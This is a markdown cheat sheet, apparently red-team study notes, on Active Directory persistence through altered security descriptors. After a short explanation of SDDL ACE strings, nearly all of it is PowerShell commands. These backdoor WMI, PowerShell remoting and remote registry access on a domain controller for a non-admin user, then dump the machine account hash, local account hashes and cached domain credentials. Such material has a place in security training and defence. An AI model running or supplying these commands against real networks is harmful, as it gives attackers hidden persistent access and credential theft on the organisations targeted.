# ACLs - Security Descriptors

* possible to modify Security Descriptors (security info like owner,primary group, dacl and sacl) of multiple remote access methods (securable objects) to allow access to non-admin users
* admin privs are required
* works as a backdoor mechanism

* Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL
```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
```

* ACE for built-in admins for WMI namespaces
```
A;CI;CCDCLCSWRPWPRCWD;;;SID   ## allow;conttainer inheret;full control over current namespace;;;SID
```


<br>

## security descriptors - WMI

* ACLs can be modified to allow non-admin users access to secureable objects

* on local machine for username
```powershell
Set-RemoteWMI -UserName username -Verbose
```

* on remote machine for username without explicit creds
```powershell
Set-remoteWMI -UserName username -ComputerName dc -namespace 'root\cimv2' -Verbose
```

* on remote machine with explicit creds. only root\cimv2 and nested namespaces
```powershell
Set-RemoteWMI -UserName username -ComputerName dc -Credential Administrator -namespace 'root\cimv2' -Verbose
```

* on remove machine remove permissions
```powershell
Set-RemoteWMI -UserName username -ComputerName dc -namespace 'root\cimv2' -Remove -Verbose
```


<br>

## security descriptors - powershell remoting

* on local machine for username
```powershell
Set-RemotePSRemoting -UserName username -Verbose
```

* on remote machine for username without credentials
```powershell
Set-RemotePSRemoting -UserName username -ComputerName dc -Verbose
```

* on remote machine remove the permissions
```powershell
Set-RemotePSRemoting -UserName username -ComputerName dc -Remove
```


<br>

## security descriptors - remote registry

* using DAMP with admin privs on remote machine
```powershell
Add-RemoteRegBackdoor -ComputerName dc -Trustee username -Verbose
```

* as username retrieve machine account hash
```powershell
Get-RemoteMachineAccountHash -ComputerName dc -Verbose
```

* retrieve local account hash
```powershell
Get-RemoteLocalAccountHash -ComputerName dc -Verbose
```

* retrieve domain cached creds
```powershell
Get-RemoteCachedCredential -ComputerName dc -Verbose
```































